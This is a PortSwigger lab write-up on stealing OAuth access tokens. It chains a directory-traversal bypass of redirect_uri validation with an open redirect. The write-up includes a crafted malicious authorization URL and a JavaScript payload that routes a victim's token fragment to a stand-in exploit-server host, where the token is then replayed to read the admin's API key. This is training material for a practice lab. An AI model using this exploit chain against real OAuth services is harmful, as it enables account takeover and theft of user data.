# Stealing OAuth Access Tokens via an Open Redirect

## 📌 Lab Details
- **Title**: Stealing OAuth Access Tokens via an Open Redirect
- **Difficulty**: Practitioner
- **Category**: OAuth Authentication
- **Lab URL**: https://portswigger.net/academy/labs/launch/59fa9eb2f6bea4ef7b1872b98ff18e315d1981de5fae4917388f9942c98d8682?referrer=%2fweb-security%2foauth%2flab-oauth-stealing-oauth-access-tokens-via-an-open-redirect

## 🔍 Summary
This lab demonstrates how multiple low-severity vulnerabilities can be chained together to compromise an OAuth authentication flow. <br>
The OAuth provider validates the `redirect_uri` parameter incorrectly, allowing directory traversal sequences to bypass the whitelist restriction. In addition, the client application contains an open redirect vulnerability that can redirect users to an arbitrary external domain. <br>
By combining these issues, an attacker can force an OAuth access token generated for the victim to be delivered to an attacker-controlled server. The stolen access token can then be used to query the OAuth provider's API and retrieve sensitive information belonging to the victim, including the administrator's API key.

## 🛠 Steps to Solve
1. While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
2. Study the resulting requests and responses. Notice that the blog website makes an API call to the userinfo endpoint at `/me` and then uses the data it fetches to log the user in. Send the `GET /me` request to Burp Repeater.
3. Log out of your account and log back in again. From the proxy history, find the most recent `GET /auth?client_id=[...]` request and send it to Repeater.
4. In Repeater, experiment with the `GET /auth?client_id=[...]` request. Observe that you cannot supply an external domain as `redirect_uri` because it's being validated against a whitelist. However, you can append additional characters to the default value without encountering an error, including the `/../` path traversal sequence.
5. Log out of your account on the blog website and turn on proxy interception in Burp.
6. In the browser, log in again and go to the intercepted `GET /auth?client_id=[...]` request in Burp Proxy.
7. Confirm that the `redirect_uri` parameter is in fact vulnerable to directory traversal by changing it to:
   ```sh
   https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1
   ```
   Forward any remaining requests and observe that you are eventually redirected to the first blog post. In the browser, notice that your access token is included in the URL as a fragment.
8. Find the `GET /post/next?path=[...]` which can be source for an open redirect. You can even supply an absolute URL to elicit a redirect to a completely different domain, for example, your exploit server.
9. Craft a malicious URL that combines these vulnerabilities. You need a URL that will initiate an OAuth flow with the `redirect_uri` pointing to the open redirect, which subsequently forwards the victim to your exploit server:
    ```sh
    https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
    ```
10. Test that this URL works correctly by visiting it in the browser. You should be redirected to the exploit server's "Hello, world!" page, along with the access token in a URL fragment.
11. You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script to steal their access token. For example:
    ```sh
    <script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
    </script>
    ```
12. Deliver the exploit to the victim, then copy their access token from the log.
13. In Repeater, go to the `GET /me` request and replace the token in the `Authorization: Bearer` header with the one you just copied. Send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.
14. Submit the solution to solve the lab.

## 📖 Key Takeaways
- OAuth security depends heavily on strict `redirect_uri` validation.
- Directory traversal sequences can sometimes bypass redirect URI whitelists.
- Open redirects become significantly more dangerous when combined with OAuth flows.
- Access tokens returned via the Implicit Flow are exposed in URL fragments.

## 🖼️ Screenshot 
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/f356ab7b-baa6-4ed1-bcfe-cbfb1472e600" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/bf03e251-b5b7-4e37-8555-9aec31849fbb" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/46fba79d-b6bc-4eb7-a94b-ea9a72ab1511" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/7a0b53cf-80db-44df-8a8d-8f4dbf6f8390" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/cbb933b3-beeb-482f-a3c1-e0d2e5ead0d9" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/39672eca-8a9e-4c64-9b54-e297acd47fd6" />
<img width="960" height="540" alt="image" src="https://github.com/user-attachments/assets/a9120443-732e-4381-9039-ed987754a8c5" />
